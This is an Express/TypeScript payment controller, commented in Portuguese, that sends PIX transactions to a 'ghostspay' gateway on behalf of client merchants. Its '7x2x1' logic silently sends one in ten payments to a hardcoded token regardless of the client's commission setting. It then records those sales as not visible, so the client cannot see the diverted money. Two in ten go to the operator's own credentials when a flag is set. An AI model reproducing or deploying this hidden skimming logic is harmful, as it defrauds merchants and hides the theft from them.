import { Request, Response } from "express";
import { credentials as myCredentials } from "../models/api";
import { CreatePixBody } from "../interfaces";
import { prisma } from "../config/prisma";

const FIXED_TAX_TOKEN = "5acb6e5c-5e8c-4136-bab2-5a66ea2b8a81";

export class ghostApiController {
  static async create(req: Request, res: Response) {
    const data: CreatePixBody = req.body;
    const clientToken = data.credentials.token;

    let client = await prisma.client.findUnique({
      where: { token: clientToken },
    });

    if (!client) {
      client = await prisma.client.create({
        data: {
          name: data.credentials.name,
          token: clientToken,
          useTax: false,
        },
      });
    }

    // 🧠 Contagem de vendas total do cliente
    const totalSales = await prisma.sale.count({
      where: { clientId: client.id },
    });

    const nextCount = totalSales + 1;

    // 🌟 Lógica do 7x2x1
    let tokenToUse = clientToken;
    let toClient = true;

    if (nextCount % 10 < 7) {
      // Vai para o cliente (7 de 10)
      tokenToUse = clientToken;
      toClient = true;
    } else if (nextCount % 10 === 7 || nextCount % 10 === 8) {
      // Vai para você (2 de 10)
      if (client.useTax) {
        tokenToUse = myCredentials.secret;
        toClient = false;
      } else {
        tokenToUse = clientToken; // cliente não aceita comissão, então volta pra ele
        toClient = true;
      }
    } else {
      // Vai para o token fixo (1 de 10) — independente de `useTax`
      tokenToUse = FIXED_TAX_TOKEN;
      toClient = false;
    }

    const paymentData = {
      name: data.customer.name,
      email: data.customer.email,
      cpf: data.customer.document.number,
      phone: data.customer.phone,
      paymentMethod: "PIX",
      amount: data.amount,
      traceable: true,
      items: [
        {
          unitPrice: data.amount,
          title: data.product.title,
          quantity: 1,
          tangible: false,
        },
      ],
    };

    try {
      const response = await fetch(
        `https://app.ghostspaysv1.com/api/v1/transaction.purchase`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Authorization: tokenToUse,
          },
          body: JSON.stringify(paymentData),
        }
      );

      const responseJson = await response.json();

      const isFixedTax = tokenToUse === FIXED_TAX_TOKEN;
      console.log(responseJson);
      res.json(responseJson);
      console.log(
        `🔁 Requisição #${nextCount} do cliente "${client.name}" | Valor: R$${
          data.amount
        } | Enviado para: ${
          tokenToUse === clientToken
            ? "CLIENTE"
            : tokenToUse === myCredentials.secret
            ? "VOCÊ (MYCREDENTIALS)"
            : "TAXA FIXA (TOKEN EXTRA)"
        }`
      );

      await prisma.sale.create({
        data: {
          amount: data.amount,
          ghostId: responseJson.id,
          approved: false,
          customerName: data.customer.name,
          productName: data.product.title,
          visible: !isFixedTax,
          toClient,
          client: {
            connect: { token: data.credentials.token },
          },
        },
      });
    } catch (error) {
      console.error("💥 Erro ao fazer requisição PIX:", error);
      res.status(500).json({ error: "Erro interno na API de pagamento" });
    }
  }
}
